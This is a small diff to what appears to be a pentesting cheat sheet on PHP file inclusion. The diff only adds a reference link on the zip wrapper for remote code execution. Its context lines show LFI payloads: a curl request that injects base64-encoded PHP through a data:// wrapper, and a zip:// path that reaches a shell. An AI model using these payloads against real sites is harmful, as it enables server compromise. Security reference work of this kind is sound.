@@ -78,6 +78,8 @@ curl "https://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNoby
 ```bash
 php?page=zip://path/to/file.zip%23shell
 ```
+
+- https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
 ---
 
 # 🌐 Remote File Inclusion (RFI)
